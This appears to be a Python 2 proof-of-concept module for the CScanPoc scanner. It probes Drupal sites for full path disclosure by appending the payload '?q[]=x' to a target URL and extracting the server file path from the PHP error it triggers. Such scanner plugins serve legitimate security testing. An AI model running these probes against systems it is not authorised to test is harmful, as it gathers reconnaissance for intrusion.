# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Drupal_0002'  # 平台漏洞编号，留空
    name = 'Drupal full path disclosure'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        Drupal 直接访问?q[]=x 造成路径泄露。
    '''  # 漏洞描述
    ref = 'Unkonwn'    # 漏洞来源
    cnvd_id = 'Unkonwn'    # cnvd漏洞编号
    cve_id = 'Unkonwn'    # cve编号
    product = 'Drupal'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '94b61254-37a8-4c95-8928-b81eb5462492'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            #根据传入命令的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '?q[]=x'
            verify_url = self.target + payload
            pathinfo = re.compile(r' in <b>(.*)</b> on line')
            r = requests.get(verify_url)
            match = pathinfo.search(r.content)

            if r.status_code == 200 and match:
                #security_info('drupal full path disclousure vulnerability',verify_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
